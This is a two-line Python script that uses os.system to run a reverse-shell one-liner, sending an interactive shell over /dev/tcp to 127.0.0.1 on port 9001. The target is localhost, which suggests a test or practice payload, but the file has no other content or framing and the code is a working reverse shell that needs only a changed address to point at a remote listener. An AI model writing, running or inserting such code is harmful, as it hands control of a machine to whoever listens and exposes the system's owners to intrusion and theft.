import os 

os.system("sh -i >& /dev/tcp/127.0.0.1/9001 0>&1")
